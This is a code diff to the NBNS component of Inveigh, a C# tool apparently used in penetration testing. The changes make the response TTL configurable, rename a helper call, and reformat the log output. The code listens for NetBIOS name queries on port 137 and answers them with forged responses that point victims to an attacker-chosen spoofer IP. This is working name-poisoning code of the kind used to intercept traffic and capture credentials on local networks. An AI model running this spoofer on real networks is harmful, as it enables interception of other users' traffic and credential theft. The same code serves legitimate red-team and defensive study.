@@ -1,7 +1,4 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
 using System.Net;
 using System.Net.Sockets;
 using System.IO;
@@ -11,7 +8,7 @@ namespace Inveigh
     class NBNS
     {
 
-        public static void NBNSListener(string IP, string spooferIP, bool enabledNBNS, string[] nbnsTypes, bool enabledFileOutput)
+        public static void NBNSListener(string IP, string spooferIP, string nbnsTTL, string[] nbnsTypes)
         {
             IPEndPoint nbnsEndpoint = new IPEndPoint(IPAddress.Broadcast, 137);
             UdpClient nbnsClient = new UdpClient(137);
@@ -27,8 +24,9 @@ namespace Inveigh
                 if (BitConverter.ToString(nbnsQuestionsAnswerRRs) == "00-01-00-00" && BitConverter.ToString(nbnsAdditionalRRs) != "00-01")
                 {
                     string nbnsResponseMessage = "";
+                    byte[] ttlNBNS = BitConverter.GetBytes(Int32.Parse(nbnsTTL));
+                    Array.Reverse(ttlNBNS);
                     byte[] nbnsTransactionID = new byte[2];
-                    byte[] nbnsTTL = { 0x00, 0x00, 0x00, 0xa5 };
                     System.Buffer.BlockCopy(udpPayload, 0, nbnsTransactionID, 0, 2);
                     byte[] nbnsRequestType = new byte[2];
                     System.Buffer.BlockCopy(udpPayload, 43, nbnsRequestType, 0, 2);
@@ -38,9 +36,9 @@ namespace Inveigh
                     string nbnsRequestHost = BytesToNBNSQuery(nbnsRequest);
                     byte[] spooferIPData = IPAddress.Parse(spooferIP).GetAddressBytes();
                     IPAddress sourceIPAddress = nbnsEndpoint.Address;
-                    nbnsResponseMessage = Common.CheckRequest(nbnsRequestHost, sourceIPAddress.ToString());
+                    nbnsResponseMessage = Util.CheckRequest(nbnsRequestHost, sourceIPAddress.ToString(), IP.ToString(), "NBNS");
 
-                    if (enabledNBNS && String.Equals(nbnsResponseMessage, "response sent"))
+                    if (Program.enabledNBNS && String.Equals(nbnsResponseMessage, "response sent"))
                     {
 
                         if (Array.Exists(nbnsTypes, element => element == nbnsQueryType))
@@ -52,10 +50,9 @@ namespace Inveigh
                                 ms.Write(nbnsRequest, 0, nbnsRequest.Length);
                                 ms.Write(nbnsRequestType, 0, 2);
                                 ms.Write((new byte[5] { 0x00, 0x00, 0x20, 0x00, 0x01 }), 0, 5);
-                                ms.Write(nbnsTTL, 0, 4);
+                                ms.Write(ttlNBNS, 0, 4);
                                 ms.Write((new byte[4] { 0x00, 0x06, 0x00, 0x00 }), 0, 4);
                                 ms.Write(spooferIPData, 0, spooferIPData.Length);
-                                ms.ToArray();
                                 IPEndPoint nbnsDestinationEndPoint = new IPEndPoint(sourceIPAddress, 137);
                                 nbnsClient.Connect(nbnsDestinationEndPoint);
                                 nbnsClient.Send(ms.ToArray(), ms.ToArray().Length);
@@ -73,7 +70,7 @@ namespace Inveigh
 
                     lock (Program.outputList)
                     {
-                        Program.outputList.Add(String.Format("[+] {0} NBNS request for {1}<{2}> received from {3} [{4}]", DateTime.Now.ToString("s"), nbnsRequestHost, nbnsQueryType, sourceIPAddress, nbnsResponseMessage));
+                        Program.outputList.Add(String.Format("[+] [{0}] NBNS request for {1}<{2}> received from {3} [{4}]", DateTime.Now.ToString("s"), nbnsRequestHost, nbnsQueryType, sourceIPAddress, nbnsResponseMessage));
                     }
 
 
